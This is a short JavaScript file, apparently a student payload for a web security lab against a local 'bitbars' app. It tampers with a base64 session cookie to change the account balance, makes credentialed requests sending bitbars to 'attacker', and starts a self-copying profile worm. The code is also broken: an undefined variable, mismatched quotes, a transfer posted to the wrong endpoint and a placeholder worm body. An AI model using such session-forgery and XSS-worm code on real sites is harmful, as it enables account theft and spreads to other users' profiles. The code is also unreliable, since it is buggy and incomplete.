var sessObj = JSON.parse(atob(document.cookie.substring(8)));
sessObj.account.bitbars = 10;
document.cookie = "session=" + btoa(JSON.stringify(sessObj));

var args1 = "destination_username=attacker&quantity=1";
var xhr1 = new XMLHttpRequest();
xhr1.withCredentials = true;
xhr1.onload = function() {  // define iterative worm behaviour
    var profile = encodeURIComponent(document.getElementById("profile").innerHTML);
	var args2 = "new_profile=".concat(prof);
	var xhr2 = new XMLHttpRequest();
	xhr2.withCredentials=true;
	xhr2.onload=function(){
        // something goes here
        // ...
	}
	xhr2.open("post", "http://localhost:3000/set_profile");
	xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr2.send(args2);
}
xhr1.open("POST", "http://localhost:3000/set_profile");
xhr1.setRequestHeader('Content-Type", "application/x-www-form-urlencoded");
xhr1.send(args1);